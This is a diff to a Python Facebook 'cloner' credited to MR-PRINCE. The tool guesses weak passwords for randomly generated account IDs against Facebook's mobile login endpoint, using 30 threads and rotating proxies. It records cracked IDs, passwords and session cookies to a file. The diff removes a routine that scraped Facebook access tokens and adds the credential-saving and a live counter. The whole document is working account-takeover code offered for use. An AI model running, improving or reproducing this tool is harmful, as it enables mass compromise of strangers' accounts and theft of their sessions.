@@ -18,20 +18,19 @@ warna = random.choice([P, M, H, K, B, U, O, N])
 def banner():
     os.system("clear")
     print(f"""{warna}
- /$$      /$$ /$$$$$$$        /$$$$$$$  /$$$$$$$  /$$$$$$ /$$   /$$  /$$$$$$  /$$$$$$$$ 
-| $$$    /$$$| $$__  $$      | $$__  $$| $$__  $$|_  $$_/| $$$ | $$ /$$__  $$| $$_____/ 
-| $$$$  /$$$$| $$  \ $$      | $$  \ $$| $$  \ $$  | $$  | $$$$| $$| $$  \__/| $$       
-| $$ $$/$$ $$| $$$$$$$/      | $$$$$$$/| $$$$$$$/  | $$  | $$ $$ $$| $$      | $$$$$    
-| $$  $$$| $$| $$__  $$      | $$____/ | $$__  $$  | $$  | $$  $$$| $$      | $$__/    
-| $$\  $ | $$| $$  \ $$      | $$      | $$  \ $$  | $$  | $$\  $$$| $$    $$| $$       
-| $$ \/  | $$| $$  | $$      | $$      | $$  | $$ /$$$$$$| $$ \  $$|  $$$$$$/| $$$$$$$$ 
-|__/     |__/|__/  |__/      |__/      |__/  |__/|______/|__/  \__/ \______/ |________/ 
----------------------------------------------------------------------------------------
+ /$$$$$$  /$$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$$$ 
+| $$__  $$| $$__  $$| $$$ | $$ /$$__  $$| $$_____/ 
+| $$  \ $$| $$  \ $$| $$$$| $$| $$  \__/| $$       
+| $$$$$$$/| $$$$$$$/| $$ $$ $$| $$      | $$$$$    
+| $$__  $$| $$__  $$| $$  $$$| $$      | $$__/    
+| $$  \ $$| $$  \ $$| $$\  $$$| $$    $$| $$       
+| $$  | $$| $$  | $$| $$ \  $$|  $$$$$$/| $$$$$$$$ 
+|__/  |__/|__/  |__/|__/  \__/ \______/ |________/ 
+---------------------------------------------------
  AUTHOR    : MR-PRINCE  
- FACEBOOK  : THE UNSTOPPABLE LEGEND MR PRINCE HERE
  TYPE      : ADVANCED CLONER  
- VERSION   : 2.0
----------------------------------------------------------------------------------------
+ VERSION   : 2.5
+---------------------------------------------------
     """)
 
 # Function to check Active & Expired Apps
@@ -49,16 +48,7 @@ def cek_apk(session, coki):
     except:
         print("[!] Error checking apps.")
 
-# Function to extract Facebook token
-def get_token(session):
-    try:
-        response = session.get("https://business.facebook.com/business_locations")
-        token = re.search(r'EAAG\w+', response.text)
-        return token.group(0) if token else None
-    except:
-        return None
-
-# Proxy System (Auto-Rotate)
+# Proxy System
 def get_proxy():
     proxy_list = [
         "http://username:password@proxy1.com:8080",
@@ -72,7 +62,7 @@ def crack(uid, password_list, mode):
     global oks, cps
     try:
         session = requests.Session()
-        session.proxies.update(get_proxy())  # Use proxy
+        session.proxies.update(get_proxy())
 
         for password in password_list:
             response = session.post("https://mbasic.facebook.com/login/device-based/regular/login/", data={
@@ -83,10 +73,12 @@ def crack(uid, password_list, mode):
 
             if "c_user" in session.cookies.get_dict():
                 coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
-                token = get_token(session)  # Extract token
-                print(f"\033[1;32m[✓] {uid} | {password} | {coki} | Token: {token}\033[0m")
-                cek_apk(session, coki)
+                print(f"\033[1;32m[PRINCE-OK] {uid} | {password} | {coki}\033[0m")
                 oks.append(uid)
+                
+                # Save successful logins
+                with open("PRINCE-OK.txt", "a") as f:
+                    f.write(f"{uid} | {password} | {coki}\n")
                 break
             elif "checkpoint" in session.cookies.get_dict():
                 print(f"\033[1;31m[CP] {uid} | {password}\033[0m")
@@ -106,7 +98,7 @@ def start_cloning():
     limit = int(input(f"{H}[•] Enter limit (e.g. 10000): "))
 
     print(f"{H}[1] Fast Mode")
-    print(f"{H}[2] Slow Mode")
+    print(f"{H}[2] Safe Mode")
     mode_choice = input(f"{H}[•] Choose mode (1/2): ")
     mode = "fast" if mode_choice == "1" else "slow"
 
@@ -114,12 +106,23 @@ def start_cloning():
         user.append(code + ''.join(random.choice(string.digits) for _ in range(7)))
 
     print(f"{H}[•] Starting Crack on {len(user)} IDs...")
+    
+    # Live count update system
+    def live_count():
+        while True:
+            sys.stdout.write(f"\r{H}[✓] OK: {len(oks)} | CP: {len(cps)}")
+            sys.stdout.flush()
+            time.sleep(5)
+
+    from threading import Thread
+    Thread(target=live_count, daemon=True).start()
+
     with ThreadPoolExecutor(max_workers=30) as executor:
         for uid in user:
             passwords = [uid[-7:], "password123", "qwerty"]
             executor.submit(crack, uid, passwords, mode)
 
-    print(f"{H}[✓] Process Completed.")
+    print(f"\n{H}[✓] Process Completed.")
     print(f"{H}[✓] OK: {len(oks)} | CP: {len(cps)}")
 
 if __name__ == "__main__":
